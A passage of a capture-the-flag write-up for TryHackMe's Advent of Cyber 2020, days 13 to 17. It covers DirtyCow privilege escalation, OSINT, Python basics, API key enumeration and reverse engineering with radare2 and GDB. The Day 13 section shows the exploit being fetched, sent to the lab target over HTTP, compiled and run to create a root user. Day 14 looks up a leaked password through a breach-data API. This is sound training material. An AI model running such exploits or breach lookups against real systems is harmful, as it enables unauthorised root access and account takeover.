12.04"),(0,i.kt)("td",{parentName:"tr",align:null},"Precise Pangolin"),(0,i.kt)("td",{parentName:"tr",align:null},"April 2012"),(0,i.kt)("td",{parentName:"tr",align:null},"April 2017")))),(0,i.kt)("p",null,"The dossier writes:"),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"That C source code is a portion of a kernel exploit called DirtyCow. Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux Kernel, taking advantage of a race condition that was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.  ")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"This cookies_and_milk.txt file looks like a modified rendition of a DirtyCow exploit, usually written in C. Find a copy of that original file online, and get it on the target box. You can do this with some simple file transfer methods like netcat, or spinning up a quick Python HTTP server... or you can simply copy-and-paste it into a text editor on the box!")),(0,i.kt)("p",null,"So, I found ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/FireFart/dirtycow/blob/master/dirty.c"},(0,i.kt)("inlineCode",{parentName:"a"},"dirty.c"))," on GitHub from FireFart. I used wget to ",(0,i.kt)("a",{parentName:"p",href:"https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c"},"download")," it from GitHub. Then I set up an http-server* for file transfer."),(0,i.kt)("p",null,"*I prefer using http-server since it a shorter command and it automatically reminds me of the IP and port on start. You could also use netcat or Python HTTP server as suggested."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'bluemoon@dragonfly:~/ctf/thm/thm-advent/day13-coal-for-christmas$ wget "https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c"\n--2020-12-13 14:14:26--  https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.124.133\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.124.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 4815 (4.7K) [text/plain]\nSaving to: \u2018dirty.c\u2019\n\ndirty.c                     100%[========================================>]   4.70K  --.-KB/s    in 0s      \n\n2020-12-13 14:14:26 (38.1 MB/s) - \u2018dirty.c\u2019 saved [4815/4815]\n\nbluemoon@dragonfly:~/ctf/thm/thm-advent/day13-coal-for-christmas$ http-server\nStarting up http-server, serving ./\nAvailable on:\n  http://127.0.0.1:8080\n  http://172.16.57.163:8080\n  http://10.6.23.34:8080\nHit CTRL-C to stop the server\n[Sun Dec 13 2020 14:17:03 GMT-0500 (Eastern Standard Time)]  "GET /dirty.c" "Wget/1.13.4 (linux-gnu)"\n^Chttp-server stopped.\n')),(0,i.kt)("p",null,"Then on the victim box, I can simply use wget to pull the file over."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ wget 10.6.23.34:8080/dirty.c\n--2020-12-13 19:17:03--  http://10.6.23.34:8080/dirty.c\nConnecting to 10.6.23.34:8080... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 4815 (4.7K) [text/x-c]\nSaving to: `dirty.c'\n\n100%[===================================================================>] 4,815       --.-K/s   in 0.001s  \n\n2020-12-13 19:17:03 (4.99 MB/s) - `dirty.c' saved [4815/4815]\n")),(0,i.kt)("p",null,"As suggested by the comments in the source code of dirty.c, we can compile it with gcc and then run it."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"gcc -pthread dirty.c -o dirty -lcrypt\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-./dirty"},"/etc/passwd successfully backed up to /tmp/passwd.bak\nPlease enter the new password: \nComplete line:\nfirefart:fi.zNBXcdv/Sk:0:0:pwned:/root:/bin/bash\n\nmmap: 7fc44dd38000\n")),(0,i.kt)("p",null,"We have now created a user with root privileges called ",(0,i.kt)("inlineCode",{parentName:"p"},"firefart")," with a password of out choosing. We can then switch also switch to this user."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ su firefart\nPassword: \nfirefart@christmas:/home/santa#\n")),(0,i.kt)("p",null,"Now let's check out our home directory (aka ",(0,i.kt)("inlineCode",{parentName:"p"},"/root"),")."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"firefart@christmas:~# cd ~/\nfirefart@christmas:~# pwd\n/root\nfirefart@christmas:~# ll\ntotal 24\ndrwx------  2 firefart root 4096 Nov 21 20:38 ./\ndrwxr-xr-x 24 firefart root 4096 Nov 21 20:38 ../\n-rw-------  1 firefart root    0 Nov 21 20:38 .bash_history\n-rw-r--r--  1 firefart root 3106 Apr 19  2012 .bashrc\n-rwxr-xr-x  1 firefart root 1422 Nov 21 20:37 christmas.sh*\n-rw-r--r--  1 firefart root  611 Nov 21 20:37 message_from_the_grinch.txt\n-rw-r--r--  1 firefart root  140 Apr 19  2012 .profile\n")),(0,i.kt)("h3",{id:"getting-the-flag-5"},"Getting the flag"),(0,i.kt)("p",null,"Let's read the ",(0,i.kt)("inlineCode",{parentName:"p"},"message_from_the_grinch.txt"),"..."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"Nice work, Santa!\n\nWow, this house sure was DIRTY!\nI think they deserve coal for Christmas, don't you?\nSo let's leave some coal under the Christmas `tree`!\n\nLet's work together on this. Leave this text file here,\nand leave the christmas.sh script here too...\nbut, create a file named `coal` in this directory!\nThen, inside this directory, pipe the output\nof the `tree` command into the `md5sum` command.\n\nThe output of that command (the hash itself) is\nthe flag you can submit to complete this task\nfor the Advent of Cyber!\n\n        - Yours,\n                John Hammond\n                er, sorry, I mean, the Grinch\n\n          - THE GRINCH, SERIOUSLY\n")),(0,i.kt)("p",null,"Ok then, I guess I'll do what he say..."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"firefart@christmas:~# touch coal\nfirefart@christmas:~# tree\n.\n|-- christmas.sh\n|-- coal\n`-- message_from_the_grinch.txt\n\n0 directories, 3 files\nfirefart@christmas:~# tree | md5sum\n8b16f00dd3b51efadb02c1df7f8427cc\n")),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"8b16f00dd3b51efadb02c1df7f8427cc")),(0,i.kt)("h2",{id:"day-14-wheres-rudolph"},"Day 14: Where's Rudolph"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Special"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: OSINT"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Special Contributor: The Cyber Mentor")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Twas the night before Christmas and Rudolph is lost Now Santa must find him, no matter the cost You have been hired to bring Rudolph back How are your OSINT skills? Follow Rudolph's tracks...")),(0,i.kt)("h3",{id:"reddit"},"Reddit"),(0,i.kt)("p",null,"All we are given is a Reddit username: ",(0,i.kt)("inlineCode",{parentName:"p"},"IGuidetheClaus2020")),(0,i.kt)("p",null,"We can view his Reddit account here: ",(0,i.kt)("inlineCode",{parentName:"p"},"https://www.reddit.com/user/IGuidetheClaus2020"),(0,i.kt)("br",{parentName:"p"}),"\n","And we can view his comment history here: ",(0,i.kt)("inlineCode",{parentName:"p"},"https://www.reddit.com/user/IGuidetheClaus2020/comments/")),(0,i.kt)("p",null,"Looking through his comment history, we can see that he was born in ",(0,i.kt)("inlineCode",{parentName:"p"},"Chicago"),".  "),(0,i.kt)("p",null,"If we do a Google search for ",(0,i.kt)("inlineCode",{parentName:"p"},"robert the creator of rudolph"),", we find that Robert's full name is ",(0,i.kt)("inlineCode",{parentName:"p"},"Robert L. May"),"  "),(0,i.kt)("p",null,"If we search his username of Google, we find his Twitter account: ",(0,i.kt)("inlineCode",{parentName:"p"},"@IGuideClaus2020")),(0,i.kt)("h3",{id:"twitter"},"Twitter"),(0,i.kt)("p",null,"We can view his Twitter account here: ",(0,i.kt)("inlineCode",{parentName:"p"},"https://twitter.com/IGuideClaus2020")),(0,i.kt)("p",null,"We learn that Rudolph's favorite TV show is the ",(0,i.kt)("inlineCode",{parentName:"p"},"Bachelorette"),"  "),(0,i.kt)("h3",{id:"photo-exif-data"},"Photo EXIF Data"),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"chicago",src:n(19549).Z,width:"650",height:"510"})),(0,i.kt)("p",null,"If we reverse Google Image search for the parade image, we find this ",(0,i.kt)("a",{parentName:"p",href:"https://www.thompsoncoburn.com/news-events/news/2019-12-09/thompson-coburn-floats-down-michigan-avenue-in-first-magnificent-mile-lights-festival-appearance"},"news article")," that tells us that the parade took place in ",(0,i.kt)("inlineCode",{parentName:"p"},"Chicago, IL"),"."),(0,i.kt)("p",null,"We can run ",(0,i.kt)("inlineCode",{parentName:"p"},"exiftool")," to get more info about the image."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day14-wheres-rudolph$ wget https://tcm-sec.com/wp-content/uploads/2020/11/lights-festival-website.jpg\n--2020-12-14 11:31:29--  https://tcm-sec.com/wp-content/uploads/2020/11/lights-festival-website.jpg\nResolving tcm-sec.com (tcm-sec.com)... 70.32.23.61\nConnecting to tcm-sec.com (tcm-sec.com)|70.32.23.61|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 51161 (50K) [image/jpeg]\nSaving to: \u2018lights-festival-website.jpg\u2019\n\nlights-festival-website.jpg                             100%[============================================================================================================================>]  49.96K  --.-KB/s    in 0.07s   \n\n2020-12-14 11:31:29 (693 KB/s) - \u2018lights-festival-website.jpg\u2019 saved [51161/51161]\n\nbluemoon@dragonfly:~/ctf/thm/thm-advent/day14-wheres-rudolph$ exiftool lights-festival-website.jpg \nExifTool Version Number         : 11.88\nFile Name                       : lights-festival-website.jpg\nDirectory                       : .\nFile Size                       : 50 kB\nFile Modification Date/Time     : 2020:11:25 10:07:43-05:00\nFile Access Date/Time           : 2020:12:14 11:32:24-05:00\nFile Inode Change Date/Time     : 2020:12:14 11:31:29-05:00\nFile Permissions                : rw-rw-r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nX Resolution                    : 72\nY Resolution                    : 72\nExif Byte Order                 : Big-endian (Motorola, MM)\nResolution Unit                 : inches\nY Cb Cr Positioning             : Centered\nCopyright                       : {FLAG}ALWAYSCHECKTHEEXIFD4T4\nExif Version                    : 0231\nComponents Configuration        : Y, Cb, Cr, -\nUser Comment                    : Hi. :)\nFlashpix Version                : 0100\nGPS Latitude Ref                : North\nGPS Longitude Ref               : West\nImage Width                     : 650\nImage Height                    : 510\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nImage Size                      : 650x510\nMegapixels                      : 0.332\nGPS Latitude                    : 41 deg 53' 30.53\" N\nGPS Longitude                   : 87 deg 37' 27.40\" W\nGPS Position                    : 41 deg 53' 30.53\" N, 87 deg 37' 27.40\" W\n")),(0,i.kt)("p",null,"We can find the coordinates of the photo to be ",(0,i.kt)("inlineCode",{parentName:"p"},"41.891815, -87.624277"),".  "),(0,i.kt)("p",null,"Ooh, we also find a flag!"),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"{FLAG}ALWAYSCHECKTHEEXIFD4T4")),(0,i.kt)("h3",{id:"finding-rudolphs-password"},"Finding Rudolph's Password"),(0,i.kt)("p",null,"On Rudolph's Twitter, we find his email: ",(0,i.kt)("inlineCode",{parentName:"p"},"rudolphthered@hotmail.com"),"  "),(0,i.kt)("p",null,"We can use ",(0,i.kt)("inlineCode",{parentName:"p"},"https://scylla.sh/api")," to find a password. ",(0,i.kt)("inlineCode",{parentName:"p"},"rudolphthered@hotmail.com:spygame"),"."),(0,i.kt)("h3",{id:"finding-rudolphs-location"},"Finding Rudolph's location"),(0,i.kt)("p",null,"We can use ",(0,i.kt)("a",{parentName:"p",href:"https://www.google.com/maps/place/41%C2%B053'30.5%22N+87%C2%B037'27.4%22W/@41.8918056,-87.6264665,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0x0!8m2!3d41.8918056!4d-87.6242778"},"Google Maps")," and the coordinates to find the Hotel that Rudolph is in."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(33121).Z,width:"1600",height:"772"})),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(42188).Z,width:"1170",height:"2532"})),(0,i.kt)("p",null,"Turns out, the address for the hotel is ",(0,i.kt)("inlineCode",{parentName:"p"},"540 North Michigan Avenue, Chicago, Illinois 60611 USA")),(0,i.kt)("h2",{id:"day-15-theres-a-python-in-my-stocking"},"Day 15: There's a Python in my stocking!"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Scripting"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Python")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Utilise Santa's favourite type of snake: Pythons to become a scripting master expert!")),(0,i.kt)("h3",{id:"whats-the-output-of-true--true"},"What's the output of ",(0,i.kt)("inlineCode",{parentName:"h3"},"True + True"),"?"),(0,i.kt)("p",null,"Since the value of True is 1 and 1 + 1 == 2, the Python interpreter says that ",(0,i.kt)("inlineCode",{parentName:"p"},"True + True == 2")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},">>> True + True\n2\n")),(0,i.kt)("h3",{id:"whats-the-database-for-installing-other-peoples-libraries-called"},"What's the database for installing other peoples libraries called?"),(0,i.kt)("p",null,"The ",(0,i.kt)("a",{parentName:"p",href:"https://pypi.org/"},"Python Package Index (PyPi)")," is the database connected to ",(0,i.kt)("inlineCode",{parentName:"p"},"pip"),"/",(0,i.kt)("inlineCode",{parentName:"p"},"pip3"),"."),(0,i.kt)("h3",{id:"what-is-the-output-of-boolfalse"},'What is the output of bool("False")?'),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},'"False"')," is actually a string and the boolean representation of a string is ",(0,i.kt)("inlineCode",{parentName:"p"},"True")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'>>> bool("False")\nTrue\n')),(0,i.kt)("h3",{id:"what-library-lets-us-download-the-html-of-a-webpage"},"What library lets us download the HTML of a webpage?"),(0,i.kt)("p",null,"The ",(0,i.kt)("inlineCode",{parentName:"p"},"requests")," library allows us to send HTTP requests in Python."),(0,i.kt)("p",null,"It can be installed by running ",(0,i.kt)("inlineCode",{parentName:"p"},"pip3 install requests"),"."),(0,i.kt)("h3",{id:"what-is-the-output-of-the-program-provided-in-code-to-analyse-for-question-5-in-todays-material"},'What is the output of the program provided in "Code to analyse for Question 5" in today\'s material?'),(0,i.kt)("p",null,"Easiest way to find out is just to run it."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day15-theres-a-python-in-my-stocking$ python3 script.py \n[1, 2, 3, 6]\n")),(0,i.kt)("h4",{id:"what-causes-the-previous-task-to-output-that"},"What causes the previous task to output that?"),(0,i.kt)("p",null,"In Python, and many other languages, lists are just a pointer to an address in memory and when we set one list equal to another we are pointing to the same list in memory. This is called ",(0,i.kt)("inlineCode",{parentName:"p"},"pass by reference"),"."),(0,i.kt)("h2",{id:"day-16-help-where-is-santa"},"Day 16: Help! Where is Santa?"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Scripting"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Requests")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Santa appears to have accidentally told Rudolph to take off, leaving the elves stranded! Utilise Python and the power of APIs to track where Santa is, and help the elves get back to their sleigh!")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.135.149")),(0,i.kt)("h3",{id:"basic-enumeration-7"},"Basic enumeration"),(0,i.kt)("p",null,"Firstly, let's run the Nmap scan!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"nmap -sC -sV -vvv -oN nmap.log 10.10.135.149\n")),(0,i.kt)("p",null,"We see that the web server is running on port ",(0,i.kt)("inlineCode",{parentName:"p"},"8000"),"."),(0,i.kt)("h3",{id:"visiting-the-webpage"},"Visiting the webpage"),(0,i.kt)("p",null,"We type ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.135.149:8000/static/index.html")," into the webpage and we find the following."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(60537).Z,width:"1918",height:"938"})),(0,i.kt)("h3",{id:"finding-santas-location"},"Finding Santa's Location"),(0,i.kt)("p",null,"Well, we could just view the page source to find the correct link, I reckon we could do it much easier in with Python."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-py"},'import requests as r\nfrom bs4 import BeautifulSoup\n\nurl = "http://10.10.135.149:8000"\n\npage = r.get(url)\npage = BeautifulSoup(page.text, "html.parser")\n\nlinks = page.find_all("a")\nfor i in links:\n    if i.get("href") not in ["#", "https://tryhackme.com"]:\n        print(i.get("href"))\n')),(0,i.kt)("p",null,"We find that the secret link is ",(0,i.kt)("inlineCode",{parentName:"p"},"http://machine_ip/api/api_key")),(0,i.kt)("h3",{id:"finding-the-api-endpoint"},"Finding the API endpoint"),(0,i.kt)("p",null,"We can find the API endpoint at ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.135.149:8000/api/")),(0,i.kt)("h3",{id:"finding-santas-location-1"},"Finding Santa's Location"),(0,i.kt)("p",null,"To find the API key, I wrote a simple Python script."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-py"},'import requests as r\n\nurl = "http://10.10.135.149:8000/api/"\n\nfor i in range(1, 100, 2):\n    response = r.get(url + str(i))\n    if \'Error. Key not valid!\' not in response.text:\n        print(f"API Key: {i}")\n        print(response.text)\n')),(0,i.kt)("p",null,"And we get the following output:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'API Key: 57\n{"item_id":57,"q":"Winter Wonderland, Hyde Park, London."}\n')),(0,i.kt)("h2",{id:"day-17-reverseelfneering"},"Day 17: ReverseELFneering"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Reverse Engineering"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: GDB, Linux")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Learn the basics of assembly and reverse engineer your first application!")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.197.43")),(0,i.kt)("h3",{id:"getting-started"},"Getting started"),(0,i.kt)("p",null,"We are given the following credentials: ",(0,i.kt)("inlineCode",{parentName:"p"},"elfmceager:adventofcyber"),". We can either work on the target instance using SSH or pull the files using SCP and work on our own machine."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"ssh elfmceager@10.10.197.43\n")),(0,i.kt)("p",null,"OR"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"scp elfmceager@10.10.197.43:~/file1 .\nscp elfmceager@10.10.197.43:~/challenge1 .\n")),(0,i.kt)("h3",{id:"practicing-with-file1"},"Practicing with file1"),(0,i.kt)("p",null,"First we open the binary in radare2 debugging mode using this command: ",(0,i.kt)("inlineCode",{parentName:"p"},"r2 -d ./file1")),(0,i.kt)("p",null,"Next, we ask r2 to analyse the program with ",(0,i.kt)("inlineCode",{parentName:"p"},"aa"),":"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"[0x00400a30]> aa\n[ WARNING : block size exceeding max block size at 0x006ba220\n[+] Try changing it with e anal.bb.maxsize\n WARNING : block size exceeding max block size at 0x006bc860\n[+] Try changing it with e anal.bb.maxsize\n[x] Analyze all flags starting with sym. and entry0 (aa)\n")),(0,i.kt)("p",null,"Then, we can look for the main function and set a breakpoint."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'[0x00400a30]> afl | grep main\n0x00400b4d    1 68           sym.main\n0x00400e10   10 1007 -> 219  sym.__libc_start_main\n0x00403870   39 661  -> 629  sym._nl_find_domain\n0x00403b10  308 5366 -> 5301 sym._nl_load_domain\n0x00415fe0    1 43           sym._IO_switch_to_main_get_area\n0x0044cf00    1 8            sym._dl_get_dl_main_map\n0x00470520    1 49           sym._IO_switch_to_main_wget_area\n0x0048fae0    7 73   -> 69   sym._nl_finddomain_subfreeres\n0x0048fb30   16 247  -> 237  sym._nl_unload_domain\n[0x00400a30]> pdf @main\n            ;-- main:\n/ (fcn) sym.main 68\n|   sym.main ();\n|           ; var int local_ch @ rbp-0xc\n|           ; var int local_8h @ rbp-0x8\n|           ; var int local_4h @ rbp-0x4\n|              ; DATA XREF from 0x00400a4d (entry0)\n|           0x00400b4d      55             push rbp\n|           0x00400b4e      4889e5         mov rbp, rsp\n|           0x00400b51      4883ec10       sub rsp, 0x10\n|           0x00400b55      c745f4040000.  mov dword [local_ch], 4\n|           0x00400b5c      c745f8050000.  mov dword [local_8h], 5\n|           0x00400b63      8b55f4         mov edx, dword [local_ch]\n|           0x00400b66      8b45f8         mov eax, dword [local_8h]\n|           0x00400b69      01d0           add eax, edx\n|           0x00400b6b      8945fc         mov dword [local_4h], eax\n|           0x00400b6e      8b4dfc         mov ecx, dword [local_4h]\n|           0x00400b71      8b55f8         mov edx, dword [local_8h]\n|           0x00400b74      8b45f4         mov eax, dword [local_ch]\n|           0x00400b77      89c6           mov esi, eax\n|           0x00400b79      488d3d881409.  lea rdi, qword str.the_value_of_a_is__d__the_value_of_b_is__d_and_the_value_of_c_is__d ; 0x492008 ; "the value of a is %d, the value of b is %d and the value of c is %d"\n|           0x00400b80      b800000000     mov eax, 0\n|           0x00400b85      e8f6ea0000     call sym.__printf\n|           0x00400b8a      b800000000     mov eax, 0\n|           0x00400b8f      c9             leave\n\\           0x00400b90      c3             ret\n[0x00400a30]> db 0x00400b55\n')),(0,i.kt)("p",null,"If we run the program, we see we immediately hit the breakpoint"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"[0x00400a30]> dc\nhit breakpoint at: 400b55\n")),(0,i.kt)("p",null,"We can check on the value of ",(0,i.kt)("inlineCode",{parentName:"p"},"local_ch"),' before and after the "',(0,i.kt)("inlineCode",{parentName:"p"},"mov dword [local_ch], 4"),'" instruction.'),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"[0x00400b55]> px @ rbp-0xc\n- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x7ffc4fef1ba4  0000 0000 1890 6b00 0000 0000 7018 4000  ......k.....p.@.\n0x7ffc4fef1bb4  0000 0000 1911 4000 0000 0000 0000 0000  ......@.........\n0x7ffc4fef1bc4  0000 0000 0000 0000 0100 0000 d81c ef4f  ...............O\n0x7ffc4fef1bd4  fc7f 0000 4d0b 4000 0000 0000 0000 0000  ....M.@.........\n0x7ffc4fef1be4  0000 0000 0600 0000 5500 0000 5000 0000  ........U...P...\n0x7ffc4fef1bf4  0400 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c04  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c14  0000 0000 0000 0000 0000 0000 0004 4000  ..............@.\n0x7ffc4fef1c24  0000 0000 e9e8 fb41 e733 73ab 1019 4000  .......A.3s...@.\n0x7ffc4fef1c34  0000 0000 0000 0000 0000 0000 1890 6b00  ..............k.\n0x7ffc4fef1c44  0000 0000 0000 0000 0000 0000 e9e8 9b46  ...............F\n0x7ffc4fef1c54  b9ac 8b54 e9e8 8f50 e733 73ab 0000 0000  ...T...P.3s.....\n0x7ffc4fef1c64  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c74  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c84  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c94  0000 0000 0000 0000 0000 0000 0000 0000  ................\n[0x00400b55]> ds\n[0x00400b55]> px @ rbp-0xc\n- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x7ffc4fef1ba4  0400 0000 1890 6b00 0000 0000 7018 4000  ......k.....p.@.\n0x7ffc4fef1bb4  0000 0000 1911 4000 0000 0000 0000 0000  ......@.........\n0x7ffc4fef1bc4  0000 0000 0000 0000 0100 0000 d81c ef4f  ...............O\n0x7ffc4fef1bd4  fc7f 0000 4d0b 4000 0000 0000 0000 0000  ....M.@.........\n0x7ffc4fef1be4  0000 0000 0600 0000 5500 0000 5000 0000  ........U...P...\n0x7ffc4fef1bf4  0400 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c04  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c14  0000 0000 0000 0000 0000 0000 0004 4000  ..............@.\n0x7ffc4fef1c24  0000 0000 e9e8 fb41 e733 73ab 1019 4000  .......A.3s...@.\n0x7ffc4fef1c34  0000 0000 0000 0000 0000 0000 1890 6b00  ..............k.\n0x7ffc4fef1c44  0000 0000 0000 0000 0000 0000 e9e8 9b46  ...............F\n0x7ffc4fef1c54  b9ac 8b54 e9e8 8f50 e733 73ab 0000 0000  ...T...P.3s.....\n0x7ffc4fef1c64  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c74  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c84  0000 0000 0000 0000 0000 0000 0000 0000  ................\n0x7ffc4fef1c94  0000 0000 0000 0000 0000 0000 0000 0000  ................\n[0x00400b55]> \n")),(0,i.kt)("p",null,"We can see how the variable's value has changed."),(0,i.kt)("h3",{id:"moving-on-to-challenge1"},"Moving on to challenge1"),(0,i.kt)("p",null,"Well now that we know the basics of ",(0,i.kt)("inlineCode",{parentName:"p"},"radare2")," (well I hope you do cause I don't lol)..."),(0,i.kt)("p",null,"So instead of using ",(0,i.kt)("inlineCode",{parentName:"p"},"radare2")," to solve challenge1, I opted to use GDB with the pwndbg add-on."),(0,i.kt)("p",null,"However, I still needed to use ",(0,i.kt)("inlineCode",{parentName:"p"},"r2")," to see what the questions were referring to."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"|           ; var int local_ch @ rbp-0xc\n|           ; var int local_8h @ rbp-0x8\n|           ; var int local_4h @ rbp-0x4\n")),(0,i.kt)("p",null,"Now, let's begin! Firstly, I started gdb using the following command:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day17-reverseelfneering$ gdb challenge1\n")),(0,i.kt)("p",null,"Then, I disassembled it to see the assembly code:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"pwndbg> disassemble main\nDump of assembler code for function main:\n   0x0000000000400b4d <+0>:     push   rbp\n   0x0000000000400b4e <+1>:     mov    rbp,rsp\n   0x0000000000400b51 <+4>:     mov    DWORD PTR [rbp-0xc],0x1\n   0x0000000000400b58 <+11>:    mov    DWORD PTR [rbp-0x8],0x6\n   0x0000000000400b5f <+18>:    mov    eax,DWORD PTR [rbp-0xc]\n   0x0000000000400b62 <+21>:    imul   eax,DWORD PTR [rbp-0x8]\n   0x0000000000400b66 <+25>:    mov    DWORD PTR [rbp-0x4],eax\n   0x0000000000400b69 <+28>:    mov    eax,0x0\n   0x0000000000400b6e <+33>:    pop    rbp\n   0x0000000000400b6f <+34>:    ret    \nEnd of assembler dump.\n")),(0,i.kt)("p",null,"Lets set some breakpoints after the instructions we want to see the results of."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"pwndbg> break *0x0000000000400b58\nBreakpoint 1 at 0x400b58\npwndbg> break *0x0000000000400b66\nBreakpoint 2 at 0x400b66\npwndbg> break *0x0000000000400b69\nBreakpoint 3 at 0x400b69\n")),(0,i.kt)("p",null,"When we hit ",(0,i.kt)("inlineCode",{parentName:"p"},"Breakpoint 1, 0x0000000000400b58 in main"),", we examine the value of ",(0,i.kt)("inlineCode",{parentName:"p"},"rbp-0xc")," (aka ",(0,i.kt)("inlineCode",{parentName:"p"},"local_ch"),") and continue to program execution."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"pwndbg> x $rbp-0xc\n0x7fffffffdf04: 0x00000001\npwndbg> c\nContinuing.\n")),(0,i.kt)("p",null,"When we hit ",(0,i.kt)("inlineCode",{parentName:"p"},"Breakpoint 2, 0x0000000000400b66 in main"),", we look for the value of ",(0,i.kt)("inlineCode",{parentName:"p"},"eax")," and continue the program execution."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"pwndbg> info registers eax\neax            0x6                 6\npwndbg> c\nContinuing.\n")),(0,i.kt)("p",null,"When we hit ",(0,i.kt)("inlineCode",{parentName:"p"},"Breakpoint 3, 0x0000000000400b69 in main"),", we look for the value of ",(0,i.kt)("inlineCode",{parentName:"p"},"rbp-0x4")," (aka ",(0,i.kt)("inlineCode",{parentName:"p"},"local_4h"),") and continue the program execution."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"pwndbg> x $rbp-0x4\n0x7fffffffdf0c: 0x00000006\npwndbg> c\nContinuing.\n")),(0,i.kt)("p",null,"Then, we see that the program 